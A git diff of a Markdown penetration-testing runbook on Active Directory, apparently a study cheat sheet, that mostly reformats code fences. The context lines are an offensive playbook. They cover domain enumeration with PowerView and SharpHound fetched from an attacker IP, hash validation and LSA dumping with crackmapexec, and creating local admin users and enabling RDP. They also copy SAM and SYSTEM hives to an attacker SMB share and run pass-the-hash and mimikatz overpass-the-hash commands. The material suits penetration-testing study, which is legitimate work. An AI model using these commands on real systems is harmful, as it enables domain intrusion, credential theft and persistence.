@@ -3,7 +3,7 @@
 
 ## Introduction
 
-This runbook provides a comprehensive guide to Active Directory enumeration. It includes a variety of techniques and tools for discovering and exploiting Active Directory configurations.
+This runbook provides a comprehensive guide to Active Directory enumeration. It includes a variety of techniques and tools for discovering and exploiting Active Directory configurations. Windows enumeration should be completed first as it will give a better understanding of the given host.
 
 ## Table of Contents
 
@@ -53,45 +53,50 @@ This runbook provides a comprehensive guide to Active Directory enumeration. It 
 ### Enumerating Users
 
   Enumerate all users in the entire domain
-```sh
+```cmd
 net user /domain
 ```
+
   Get information from a specific user
-```sh
+```cmd
 net user <user> /domain
 ```
+
   Enumerate logged users
-```sh
-Import-Module .\PowerView.ps1
+```powershell
+# powerview 
 Get-NetLoggedon -ComputerName <computer_name>
 ```
+
   Enumerate all active sessions
-```
+```powershell
+# powerview
 Get-NetSession -ComputerName dc1
 ```
 
 ### Enumerating Groups
 
   Enumerate all groups in the entire domain
-```sh
+```cmd
 net group /domain
 ```
+
   Get members of local group
-```sh
+```powershell
 Get-NetLocalGroup -ComputerName <domain> -Recurse (PowerView)
 ```
 
 ### Domain Information
 
   Find out domain controller hostname
-```sh
+```powershell
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
 ### [PowerView Module](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
 
  Configure ActiveDirectory Module - RSAT
-```
+```cmd
 curl https://raw.githubusercontent.com/samratashok/ADModule/master/ActiveDirectory/ActiveDirectory.psd1 -o ActiveDirectory.psd1  
 curl https://github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true -o Microsoft.ActiveDirectory.Management.dll  
 Import-Module .\Microsoft.ActiveDirectory.Management.dll  
@@ -100,21 +105,21 @@ Import-Module .\ActiveDirectory.psd1
 
 ### Last Logon
 
-```cmd
+```powershell
 # powerview
 Get-LastLoggedOn -ComputerName <domain>
 ```
 
 ### List Computers
 
-```cmd
+```powershell
 # powerview
 Get-NetComputer 
 ```
 
 ### Add Domain User to a Domain Group
 
-```cmd
+```powershell
 # powerview
 Add-DomainGroupMember -Identity 'SQLManagers' -Members 'examed'
 Get-NetGroupMember -GroupName 'SQLManagers'
@@ -149,7 +154,7 @@ Foreach($obj in $Result)
 ### Access
 
   Validation of network user credentials via smb using crackmmapexec  
-```
+```sh
 crackmapexec smb <IP> -u <user> -H <hash> -d <domain> --continue-on-success
 crackmapexec smb <IP> -u <user> -H <hash> > -d <domain> 
 crackmapexec smb <IP> -u <user> -H <hash> -H <hash> --local-auth --lsa  
@@ -157,16 +162,18 @@ crackmapexec smb <IP> -u <user> -p <password>
 ```
 
   Connect via smbclient
-```
+```sh
 smbclient //ip -U <user> -L
 smbclient //<ip>>/<share> -U <domain>//<user>%<pass>  
 ```
+
   smbmap
-```
+```sh
 smbmap -H <ip> -u <user> 
 ```
+
   Permission of given user on smb shares
-```
+```sh
 crackmapexec smb <IP> --shares -u <user> -p '<pass>'
 ```
 
@@ -186,7 +193,7 @@ start neo4j - http://localhost:7474/
 sudo neo4j start
 ```
  Windoews - Enumeration
-``` powershell
+```powershell
 iwr -uri <ip>/SharpHound.ps1 -Outfile SharpHound.ps1
 . .\SharpHound.ps1
 Invoke-Bloodhound -CollectionMethod All,loggedon
@@ -202,15 +209,18 @@ Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
 ```cmd
 net user <user> <password> /add
 ```
+
   Add to local administrators group  
 ```cmd
 net localgroup Administrators <user> /add
 ```
+
   Add to group of users who can access via RDP
 ```cmd
 net localgroup "Remote Management Users" <user> /add
 net localgroup "Remote Desktop Users" <user> /add
 ```
+
   Enable RDP
 ```powershell
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
@@ -223,6 +233,7 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 ```
 xfreerdp /u:user /p:pass /v:ip +clipboard /dynamic-resolution /cert:ignore /drive:/usr/share/windows-resources,share
 ```
+
   rdesktop via RDP  
 ```
 rdesktop -u <user> -p <password> -d <domain> -f <ip>
@@ -240,6 +251,7 @@ evil-winrm -i <ip> -u <user> -p <password>
 ```cmd
 runas /user:<hostname>\<user> cmd
 ```
+
   PSexec
 ```cmd
 ./PsExec64.exe -i \\<remote-ip> -u <domain\user> -p <password> cmd
@@ -282,6 +294,7 @@ net use z: \\<smbserver>\share /USER:user test123
 copy C:\Users\Backup\sam.hive z:\
 copy C:\Users\Backup\system.hive z:\
 ```
+
   View smb enumeration  
 ```
 net view \\dc /all
@@ -432,11 +445,13 @@ or
 ```sh
 pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
 ```
+
   Remote Access - impacket-psexec  
 ```sh
 impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
 impacket-psexec '<domain>/<user>'@<IP>
 ```
+
   Remote Access + evil-winrm  
 ```sh
 evil-winrm -i <IP> -u <user> -H <hash>
@@ -445,9 +460,11 @@ evil-winrm -i <IP> -u <user> -H <hash>
 ### Over Pass the Hash
 
 Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user
+
 ```cmd
 mimikatz.exe "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm.hash> /run:PowerShell.exe" "exit"
 ```
+
    Command execution with psexec  
 ``` cmd
 .\PsExec.exe \\<hostname> cmd.exe
